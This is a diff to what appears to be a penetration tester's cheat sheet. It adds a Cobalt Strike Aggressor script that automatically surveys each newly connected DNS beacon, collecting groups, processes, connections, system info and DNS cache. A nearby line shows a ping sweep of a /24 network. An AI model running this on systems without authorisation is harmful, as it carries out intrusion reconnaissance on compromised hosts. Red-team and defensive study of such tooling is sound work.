@@ -89,6 +89,20 @@ $(date +%Y-%m-%d-%H-%M-%S)
 ### Ping scan /24 range via loop
 `FOR /L %i in (1,1,255) do @ping -n 1 <prefix>.%i | find "Reply"`
 
+## Cobalt Strike Aggressor Scripting
+### Automate initial information gathering on new DNS beacon
+```
+on beacon_initial_empty {
+	bnote($1,"Established: " . formatDate('MM/dd/yyyy HH:mm:ss (z)'));
+	btask($1, "Surveying the target!", "T1082");
+	bshell!($1, "echo Groups && whoami /groups");
+	bshell!($1, "echo Processes && tasklist /v");
+	bshell!($1, "echo Connections && netstat -na | findstr \"EST\"");
+	bshell!($1, "echo System Info && systeminfo");
+	bshell!($1, "echo DNS cache && ipconfig /displaydns");
+}
+```
+
 # Python virtual environments
 ## Install virtualenv
 `pip install virtualenv`
